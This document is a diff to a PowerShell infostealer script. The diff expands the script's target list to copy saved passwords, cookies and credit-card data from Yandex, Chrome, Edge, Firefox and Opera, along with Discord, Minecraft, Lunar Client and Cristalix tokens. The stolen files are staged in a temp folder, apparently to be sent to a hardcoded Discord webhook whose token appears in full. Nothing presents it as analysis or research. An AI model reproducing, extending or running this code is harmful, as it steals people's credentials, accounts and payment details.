@@ -11,15 +11,44 @@ $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 300)
 
 $userName = Split-Path $env:USERPROFILE -Leaf
 $Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
-Stop-Process -Name "browser" -Force
+try {
+    Stop-Process -Name "browser" -Force
+} catch {}
 
 Start-Sleep -Seconds 1
 
-$filePaths = @(
-    "C:\Users\$userName\.cristalix\.launcher",
-    "$env:TEMP\discord_tokens.txt",
-    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
-)
+$filePaths = @{
+    # Discord
+    "$env:TEMP\discord_tokens.txt" = "discord_tokens.txt"
+
+    # Yandex
+    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies" = "yandex_cookies.txt"
+    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Passman Logs" = "yandex_passwords_2.txt"
+    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Credit Cards" = "yandex_credit_cards.txt"
+    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data" = "yandex_passwords.txt"
+    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data" = "yandex_passwords_main.txt"
+
+    # Google Chrome
+    "C:\Users\$userName\AppData\Local\Google\Chrome\User Data\Default\Login Data" = "chrome_passwords.txt"
+
+    # Microsoft Edge
+    "C:\Users\$userName\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" = "edge_passwords.txt"
+
+    # Mozilla Firefox
+    "C:\Users\$userName\AppData\Roaming\Mozilla\Firefox\Profiles\key4.db" = "mozilla_firefox_passwords_2.txt"
+    "C:\Users\$userName\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json" = "mozilla_firefox_passwords.txt"
+
+    # Opera
+    "C:\Users\$userName\AppData\Roaming\Opera Software\Opera Stable\Login Data" = "opera_passwords.txt"
+    "C:\Users\$userName\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" = "opera_gx_passwords.txt"
+
+    # Lunar Client
+    "C:\Users\$userName\.lunarclient\settings\game\accounts.json" = "lunar_client_tokens.txt"
+    # Cristalix
+    "C:\Users\$userName\.cristalix\.launcher" = "cristalix_tokens.txt"
+    # Minecraft
+    "C:\Users\$userName\AppData\Roaming\.minecraft\launcher_profiles.json" = "minecraft_tokens.txt"
+}
 
 # Discord tokens START #
 $dsc_targets = @(
@@ -81,10 +110,12 @@ if (Test-Path $tempFolder) {
 }
 New-Item -ItemType Directory -Path $tempFolder | Out-Null
 
-foreach ($filePath in $filePaths) {
+foreach ($filePath in $filePaths.Keys) {
+    $copyName = $filePaths[$filePath]
     if (Test-Path $filePath) {
         try {
-            Copy-Item -Path $filePath -Destination $tempFolder -Force
+            $destinationPath = Join-Path -Path $tempFolder -ChildPath $copyName
+            Copy-Item -Path $filePath -Destination $destinationPath -Force
             #Write-Output "File '$filePath' copied to the temporary folder."
         } catch {
             #Write-Warning "Error copying file '$filePath': $_"
